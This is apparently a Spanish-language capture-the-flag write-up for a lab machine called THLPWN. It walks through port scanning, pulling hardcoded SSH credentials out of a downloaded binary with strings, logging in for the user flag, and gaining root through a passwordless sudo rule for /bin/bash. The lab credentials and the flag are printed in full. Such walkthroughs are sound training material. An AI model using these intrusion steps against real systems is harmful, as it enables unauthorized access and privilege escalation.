
# 🏁 CTF Report: THLPWN

## 📁 Entorno inicial
```bash
ctf-init THLPWN
```
[+] Entorno CTF creado en `/home/predator/Escritorio/THLPWN`  
📁 `exploit`  📁 `files`  📁 `notes`  📁 `post`  📁 `recon`

---

## 🔍 Reconocimiento inicial
### Servicios expuestos:
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

`extractPorts allPorts`  
[*] Extracting information...  
&nbsp;&nbsp;&nbsp;&nbsp;[*] IP Address: `xxx.xxx.xxx.xxx`  
&nbsp;&nbsp;&nbsp;&nbsp;[*] Open ports: `22,80`  
✅ *Ports copied to clipboard*

---

## 🧪 Enumeración avanzada
```bash
enum 21,22,80
```
→ `80/tcp open  http    nginx 1.22.1`  
→ `|_http-title: 403 Forbidden`

### 🌐 Resolución de dominio
Agregamos al `/etc/hosts`:  
```bash
echo "xxx.xxx.xxx.xxx thlpwn.thl" | sudo tee -a /etc/hosts
```
→ Accedemos a: `http://thlpwn.thl`
<img width="1920" height="1006" alt="binarioweb" src="https://github.com/user-attachments/assets/6764068a-1a0b-4f88-be3e-abc43919ddf5" />

---

## ⚙️ Explotación del binario
Descargamos `auth_checker` desde la web → analizamos con:  
```bash
strings auth_checker
```
🔍 ¡VULNERABILITY EXPLOITED SUCCESSFULLY!  
Exposición directa de credenciales SSH:

```
SSH Access Credentials:
========================
Username: thluser
Password: 9Kx7mP2wQ5nL8vT4bR6zY
Connect with:
ssh thluser@xxx.xxx.xxx.xxx
```

---

## 🚪 Acceso inicial (user flag)
```bash
ssh thluser@xxx.xxx.xxx.xxx
```
```bash
thluser@thlpwn:~$ ls
flag.txt
thluser@thlpwn:~$ cat flag.txt
THL{3x7K9mL2pQ8vW5nR4zT6yH}
```

---

## 🛠️ Escalada de privilegios
```bash
thluser@thlpwn:~$ sudo -l
```
```
Matching Defaults entries for thluser on thlpwn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User thluser may run the following commands on thlpwn:
    (ALL) NOPASSWD: /bin/bash
```

```bash
thluser@thlpwn:~$ sudo /bin/bash
root@thlpwn:/home/thluser# cd /root
root@thlpwn:~# ls
root.txt
root@thlpwn:~# cat root.txt
HACKEADA DE MANERA EASY
```

---

## 🎯 Resumen final
- ✅ **User flag**: `THL{3x7K9mL2pQ8vW5nR4zT6yH}`  
- ✅ **Root flag**:  
- ✅ **Método clave**: Exposición de credenciales en binario + `sudo /bin/bash` sin contraseña  

